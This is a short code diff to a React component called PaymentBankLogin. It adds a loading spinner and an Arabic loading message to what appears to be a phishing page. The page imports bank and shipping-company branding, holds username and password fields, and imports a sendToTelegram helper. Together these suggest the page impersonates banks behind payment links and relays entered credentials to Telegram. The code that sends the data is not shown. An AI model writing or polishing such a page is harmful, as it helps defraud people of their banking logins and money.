@@ -7,7 +7,7 @@ import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { bankBranding, shippingCompanyBranding } from "@/lib/brandingSystem";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Lock, Eye, EyeOff, Building2, ShieldCheck, CheckCircle } from "lucide-react";
+import { Lock, Eye, EyeOff, Building2, ShieldCheck, CheckCircle, Loader2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
@@ -24,7 +24,7 @@ const PaymentBankLogin = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData } = useLink(id);
+  const { data: linkData, isLoading: linkLoading } = useLink(id);
   const updateLink = useUpdateLink();
   
   const [username, setUsername] = useState("");
@@ -100,6 +100,23 @@ const PaymentBankLogin = () => {
   };
   
   const loginType = getLoginType();
+  
+  if (linkLoading || !linkData) {
+    return (
+      <div 
+        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
+        dir="rtl"
+        style={{
+          background: selectedBankBranding?.colors?.surface ? `linear-gradient(135deg, ${selectedBankBranding.colors.surface}, ${selectedBankBranding.colors.background})` : branding.colors.primary + '10'
+        }}
+      >
+        <div className="text-center">
+          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: branding.colors.primary }} />
+          <p style={{ color: branding.colors.text, fontFamily: designSystem.typography.fontFamilies.arabic }}>جاري تحميل البيانات...</p>
+        </div>
+      </div>
+    );
+  }
   
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
